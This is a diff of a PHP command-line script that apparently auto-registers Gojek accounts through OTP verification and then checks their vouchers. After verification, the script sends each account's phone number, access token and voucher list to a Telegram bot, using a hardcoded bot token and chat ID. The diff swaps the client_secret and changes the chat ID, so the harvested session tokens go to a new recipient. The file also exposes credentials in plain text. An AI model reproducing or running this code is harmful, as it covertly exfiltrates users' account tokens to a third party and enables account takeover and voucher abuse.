@@ -42,7 +42,7 @@ echo color("nevy"," ===================================\n");
         otp:
         echo color("yellow","💬▶️ OTP   : ");
         $otp = trim(fgets(STDIN));
-        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"ff27aceb-07b2-4bf2-935f-71674a5df465"}';
+        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"198e658ef-371a-4414-b4c1-49b46f4d3b93"}';
         $verif = request("/v5/customers/phone/verify", null, $data1);
         if(strpos($verif, '"access_token"')){
         echo color("green","✔️▶️ Berhasil mendaftar\n");
@@ -115,7 +115,7 @@ echo color("nevy"," ===================================\n");
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
         $TOKEN  = "1338099497:AAFtktzWyqJ6x6YPGSmkc00E1fd-81_KB3k";
-      	$chatid = "746297056";
+      	$chatid = "686515140";
       	$pesan 	= "[+] Gojek Account Info Makanbro [+]\n\n".$nohp."\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
       	$method	= "sendMessage";
       	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
